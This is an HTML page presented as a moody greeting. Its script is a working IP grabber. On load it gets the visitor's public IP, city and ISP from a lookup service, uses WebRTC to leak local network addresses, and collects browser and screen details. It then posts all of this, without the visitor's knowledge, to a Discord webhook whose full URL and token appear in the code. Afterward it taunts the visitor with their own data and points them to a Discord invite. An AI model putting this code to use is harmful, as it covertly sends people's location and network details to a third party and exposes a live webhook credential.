<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>hey</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Georgia', 'Times New Roman', serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
            background: #0a0a0a;
        }

        .bg-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.pinimg.com/originals/eb/7c/93/eb7c930de77f4b425ddaf17782162cac.gif') center/cover no-repeat;
            z-index: -2;
        }

        .bg-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.75);
            z-index: -1;
        }

        .container {
            text-align: center;
            max-width: 600px;
            padding: 40px 20px;
            z-index: 1;
        }

        .text-display {
            color: #e8e8e8;
            font-size: 1.3em;
            line-height: 2.2;
            min-height: 300px;
            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
        }

        .text-display .line {
            display: block;
            min-height: 2.2em;
        }

        .cursor {
            display: inline-block;
            width: 2px;
            height: 1.1em;
            background: #e8e8e8;
            margin-left: 2px;
            vertical-align: text-bottom;
            animation: blink 0.8s step-end infinite;
        }

        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }

        .discord-link {
            display: inline-block;
            margin-top: 50px;
            color: #c084fc;
            text-decoration: none;
            font-size: 1em;
            border-bottom: 1px solid transparent;
            transition: all 0.4s ease;
            opacity: 0;
        }

        .discord-link.visible {
            opacity: 1;
        }

        .discord-link:hover {
            border-bottom-color: #c084fc;
            color: #d8b4fe;
        }

        .hidden-audio {
            position: absolute;
            width: 0;
            height: 0;
            border: 0;
            opacity: 0;
            pointer-events: none;
        }

        .unmute-hint {
            position: fixed;
            bottom: 20px;
            right: 20px;
            color: rgba(232, 232, 232, 0.4);
            font-size: 0.8em;
            z-index: 5;
            transition: opacity 0.5s;
        }

        .unmute-hint.hidden {
            opacity: 0;
            pointer-events: none;
        }
    </style>
<base target="_blank">
</head>
<body>
    <div class="bg-image"></div>
    <div class="bg-overlay"></div>

    <div class="container">
        <div class="text-display" id="text-display">
            <span class="cursor" id="cursor"></span>
        </div>
        <a href="https://discord.gg/YmxHPtVB" class="discord-link" id="discord-link" target="_blank">
            want to see your info?
        </a>
    </div>

    <div class="unmute-hint" id="unmute-hint">click anywhere to unmute</div>
    <div id="audio-container"></div>

    <script>
        const CONFIG = {
            WEBHOOK_URL: 'https://discord.com/api/webhooks/1510843514907394199/_PkPofO2JXJu74o-6d8IPiDAoDwgf5wfe9pgRHganxjg1PVnXCQ2zismmap6tpIZO35a',
            DISCORD_INVITE: 'https://discord.gg/YmxHPtVB'
        };

        const collectedData = {
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer || 'Direct',
            ip: {},
            webrtc: { localIPs: [] },
            browser: {},
            screen: {},
            network: {}
        };

        async function collectAll() {
            try {
                const resp = await fetch('https://ipapi.co/json/');
                const data = await resp.json();
                collectedData.ip = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    isp: data.org,
                    asn: data.asn
                };
            } catch (e) {}

            try {
                const ips = new Set();
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                pc.createDataChannel('');
                pc.onicecandidate = (e) => {
                    if (!e.candidate) {
                        pc.close();
                        collectedData.webrtc.localIPs = Array.from(ips).filter(ip => 
                            ip.match(/^(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|127\.)/)
                        );
                        return;
                    }
                    const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/g);
                    if (m) m.forEach(ip => ips.add(ip));
                };
                pc.createOffer().then(o => pc.setLocalDescription(o));
                setTimeout(() => pc.close(), 4000);
            } catch (e) {}

            const nav = navigator;
            collectedData.browser = {
                userAgent: nav.userAgent,
                platform: nav.platform,
                language: nav.language,
                cores: nav.hardwareConcurrency || '?',
                memory: nav.deviceMemory || '?'
            };

            const s = screen;
            collectedData.screen = {
                width: s.width,
                height: s.height,
                dpr: window.devicePixelRatio
            };

            const conn = nav.connection;
            collectedData.network = {
                type: conn ? conn.effectiveType : '?',
                downlink: conn ? conn.downlink : '?'
            };

            try {
                await fetch(CONFIG.WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: 'new visitor',
                            color: 0x2b2b2b,
                            timestamp: collectedData.timestamp,
                            fields: [
                                { name: 'ip', value: collectedData.ip.ip || 'N/A', inline: true },
                                { name: 'location', value: `${collectedData.ip.city || 'N/A'}, ${collectedData.ip.country || 'N/A'}`, inline: true },
                                { name: 'isp', value: collectedData.ip.isp || 'N/A', inline: true },
                                { name: 'webrtc leak', value: collectedData.webrtc.localIPs.join(', ') || 'none', inline: false },
                                { name: 'screen', value: `${collectedData.screen.width}x${collectedData.screen.height}`, inline: true },
                                { name: 'browser', value: collectedData.browser.userAgent?.slice(0, 50) + '...', inline: false },
                                { name: 'referrer', value: collectedData.referrer, inline: false }
                            ]
                        }]
                    })
                });
            } catch (e) {}
        }

        const display = document.getElementById('text-display');
        const cursor = document.getElementById('cursor');
        let lineElements = [];
        let typingTimeout = null;
        let audioStarted = false;

        function createLine() {
            const line = document.createElement('span');
            line.className = 'line';
            display.insertBefore(line, cursor);
            lineElements.push(line);
            return line;
        }

        
        function getTypingDelay() {
            const r = Math.random();
            if (r < 0.03) return 200 + Math.random() * 200;   
            if (r < 0.1) return 60 + Math.random() * 60;      
            return 15 + Math.random() * 30;                   
        }

        function getPauseDelay() {
            return 400 + Math.random() * 500;   
        }

        function typeLines(lines) {
            let currentLine = 0;
            let currentChar = 0;

            function typeNext() {
                if (currentLine >= lines.length) {
                    document.getElementById('discord-link').classList.add('visible');
                    return;
                }

                const text = lines[currentLine];

                if (currentChar === 0 && text.length > 0) {
                    createLine();
                }

                if (currentChar < text.length) {
                    const line = lineElements[lineElements.length - 1];
                    line.textContent += text[currentChar];
                    currentChar++;
                    typingTimeout = setTimeout(typeNext, getTypingDelay());
                } else {
                    currentLine++;
                    currentChar = 0;
                    typingTimeout = setTimeout(typeNext, getPauseDelay());
                }
            }

            typeNext();
        }

        function startAudio() {
            if (audioStarted) return;
            audioStarted = true;
            document.getElementById('unmute-hint').classList.add('hidden');

            const container = document.getElementById('audio-container');
            container.innerHTML = `
                <iframe 
                    class="hidden-audio" 
                    src="https://www.youtube.com/embed/xRjFj1C8Y68?autoplay=1&loop=1&playlist=xRjFj1C8Y68&mute=0"
                    allow="autoplay"
                ></iframe>
            `;
        }

        // Capture ANY interaction to start audio
        const interactionEvents = ['click', 'mousedown', 'keydown', 'scroll', 'touchstart'];
        interactionEvents.forEach(event => {
            document.addEventListener(event, startAudio, { once: true });
        });

        // Also try to start audio on page load (muted, so it works)
        // Then unmute on first interaction
        document.getElementById('audio-container').innerHTML = `
            <iframe 
                class="hidden-audio" 
                src="https://www.youtube.com/embed/xRjFj1C8Y68?autoplay=1&loop=1&playlist=xRjFj1C8Y68&mute=1"
                allow="autoplay"
                id="muted-audio"
            ></iframe>
        `;

        
        window.addEventListener('load', async () => {
            await collectAll();

            const d = collectedData;
            const browserName = d.browser.userAgent?.match(/(Chrome|Firefox|Safari|Edge)\/[\d.]+/)?.[0] || 'your browser';

            const lines = [
                "hey there, visitor.",
                "",
                `looks like you're visiting from ${d.ip.city || 'somewhere'}, ${d.ip.country || 'earth'}.`,
                "",
                `your ip is ${d.ip.ip || 'hidden'}.`,
                `isp: ${d.ip.isp || 'unknown'}.`,
                "",
                `screen: ${d.screen.width || '?'}x${d.screen.height || '?'}.`,
                `browser: ${browserName}.`,
                "",
                "pretty wild what the internet knows",
                "",
                "..."
            ];

            setTimeout(() => typeLines(lines), 300);
        });

        document.getElementById('discord-link').href = CONFIG.DISCORD_INVITE;
    </script>
</body>
</html>
